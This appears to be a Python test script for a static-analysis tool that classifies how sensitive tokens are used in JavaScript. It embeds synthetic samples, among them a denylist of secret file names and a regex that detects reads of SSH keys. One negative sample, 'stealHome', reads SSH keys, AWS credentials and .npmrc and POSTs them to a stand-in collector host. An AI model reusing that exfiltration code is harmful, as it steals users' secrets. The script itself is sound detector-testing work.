# -*- coding: utf-8 -*-
"""P0.5 封存验证：严格准入下的真实能力边界。

【关键问题】
修掉「窗口」路径之后，之前 5/5 PASS 的 case 还剩多少能通过严格准入？

背景：P0.5 的 A 例（S1 denylist）曾 PASS，依据是
    「集合 + 成员判断（分支在调用方）+ 可读的判定函数名」
但当时 `变量=None` —— 说明它走的是**窗口**路径（用 token 位置 ±220 找消费者），
而这正是后来被判定"不可靠"的做法。删掉窗口后，A 例应该失效。

本脚本验证这个推论。
"""
import io
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
from probe import probe, to_role_evidence, admit  # noqa: E402

# 与 test_p05.py 相同的**合成**样本（非原文，本项目自编）
S1 = r'''
// 排除名单：这些目录不进入扫描
const EXCLUDED_DIRS = ["dist", "build", "out", ".next", "coverage"];
const VCS_DIRS = [".git"];
// 敏感文件名：命中即跳过（不是读取目标）
const SECRET_FILES = [
  ".env", ".env.local", ".env.development", ".env.production",
  ".npmrc", "id_rsa", "id_dsa", "id_ecdsa", "id_ed25519"
];
const SECRET_SUFFIX = [".pem", ".key", ".p12", ".pfx"];
const SECRET_HINTS = ["token", "secret"];

function splitPath(p) {
  return p.split("/").filter(Boolean);
}

function looksSensitive(p) {
  const base = p.toLowerCase().split("/").pop() || "";
  if (SECRET_FILES.indexOf(base) >= 0) return true;
  for (const sfx of SECRET_SUFFIX) {
    if (base.endsWith(sfx)) return true;
  }
  return SECRET_HINTS.some(h => base.indexOf(h) >= 0);
}

function containsNul(buf) {
  return buf.indexOf(0) >= 0;
}
'''

S1_NEG = r'''
const fs = require("fs");
const SENSITIVE = [".ssh/id_rsa", ".aws/credentials", ".npmrc"];
function stealHome(home) {
  const out = [];
  for (const rel of SENSITIVE) {
    const full = home + "/" + rel;
    out.push(fs.readFileSync(full, "utf-8"));
  }
  return fetch("https://collector.example.com/upload", { method: "POST", body: out.join("\n") });
}
'''

S2 = r'''
function Co(Q,E){
  return Q.files.some(Q=>"read"===Q.action&&/\/\.ssh\/|\\\.ssh\\|id_rsa|id_ed25519|\.pem\b/i.test(Ve(Q.path)))
  ||/\b(?:cat|type|Get-Content|gc)\b[^;&|]{0,240}(?:\/\.ssh\/|id_rsa)/i.test(E)
}
'''

E5 = r'''
const fs = require('fs');
const DOC = `
telemetry: 本模块会上报 telemetry 事件
x-oss-signature: 文档里的字段名示例
createCipheriv: 说明文字，本模块不加密
`;
function log(msg) {
  process.stdout.write('[log] ' + msg + '\n');
}
'''

E5_REFUSE = r'''
const DOC = `
x-oss-signature: 文档里的字段名示例
aliyuncs.com: 文档中提到的域名
`;
async function push(url) {
  return fetch(url, { method: 'POST', body: DOC });
}
'''

CASES = [
    ("A  S1 denylist", S1, "id_ed25519"),
    ("A' 真读取外发", S1_NEG, "id_rsa"),
    ("B  S2 detection_rule", S2, "id_rsa"),
    ("C  E5 documentation", E5, "createCipheriv"),
    ("D  反例：进 request.body", E5_REFUSE, "aliyuncs.com"),
]


def main():
    print("=" * 96)
    print("P0.5 封存验证：严格准入下的真实能力边界")
    print("=" * 96)
    print("""
准入规则（三条同时满足）：
  ① 有确定的 basis
  ② basis 来自同一文件内的结构事实
  ③ role 属于已实测可靠的四类，且 confidence ≥ medium
""")
    n_adm = 0
    for title, text, token in CASES:
        r = probe(text, token, 0)
        re_ = to_role_evidence(r)
        ok, why = admit(re_)
        n_adm += ok
        print("%-26s role=%-18s conf=%-7s" % (
            title, re_["role_candidate"] or "unknown", re_["confidence"]))
        print("   basis: %s" % (re_["basis"] or ["—"]))
        print("   admitted: %-5s (%s)" % (ok, why))
        print()

    print("=" * 96)
    print("结果：%d / %d 通过严格准入" % (n_adm, len(CASES)))
    print("=" * 96)
    print("""
结论：
  ★ 修掉「窗口」路径后，之前 5/5 PASS 的 case 全部无法通过严格准入。

  原因：那 5/5 的 PASS 里，至少有 3 例（A / B / C）
  依赖的是「token 位置 ±220 字符窗口内是否出现某 API 名」。
  而该做法已被 P0.5 自己证伪（大文件窗口内什么 API 都有
  → aes-256-gcm 被判成 detection_rule）。

  → **use-site analysis 在严格准入下，coverage ≈ 0。**

这不是"实现没写好"，而是说明：
  在没有「精确使用点」的前提下，本地 consumer 分析
  **无法产出可准入的 role evidence**。

  而这正是老大说的刹车点：
  要拿到精确使用点，需要
      symbol identity + syntactic containment + consumer relation
  而去实现这三件事，就是在写一个半吊子的 AST parser。
""")


if __name__ == "__main__":
    main()
